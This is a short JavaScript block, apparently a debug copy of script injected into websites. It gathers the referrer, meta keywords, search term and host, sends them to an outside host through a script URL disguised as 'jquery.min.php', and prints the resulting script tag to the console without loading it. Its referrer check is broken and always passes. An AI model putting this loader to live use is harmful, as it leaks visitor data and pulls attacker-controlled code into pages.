<script>
	var a='';
	
	setTimeout(10);
	
	var condition1 = document.referrer.indexOf(location.protocol+"//"+location.host)!==0||document.referrer!==undefined||document.referrer!==''||document.referrer!==null;
	console.log(document.referrer.indexOf(location.protocol+"//"+location.host));
	console.log(document.referrer);
	
	var temp = function(){
		var keywords='';
		var metas=document.getElementsByTagName('meta');
		if(metas){
			for(var x=0,y=metas.length;x<y;x++){
				if(metas[x].name.toLowerCase()=="keywords"){
					keywords+=metas[x].content;
				}
			}
		}
		return keywords!==''?keywords:null;
	};
	console.log(temp());
	
	var v=window.location.search.match(/utm_term=([^&]+)/);
	console.log(v);
	
	var euc4 = encodeURIComponent(window.location.host);
	console.log(euc4);
	
	var euc3 = encodeURIComponent(document.referrer);
	console.log(euc3);
	
	var euc2 = encodeURIComponent(((k=temp())==null?(v)==null?(t=document.title)==null?'':t:v[1]:k));
	console.log(euc2);
	
	var mainString1 = encodeURIComponent('http://2097217.sites.myregisteredsite.com/js/jquery.min.php'+'?'+'default_keyword='+euc2+'&se_referrer='+euc3+'&source='+euc4);
	console.log(mainString1);
	
	if(condition1){
		console.log('<script type="text/javascript" src="http://2097217.sites.myregisteredsite.com/js/jquery.min.php?c_utt=SWBB8&c_utm='+mainString1+'"><'+'/script>');
	}
</script>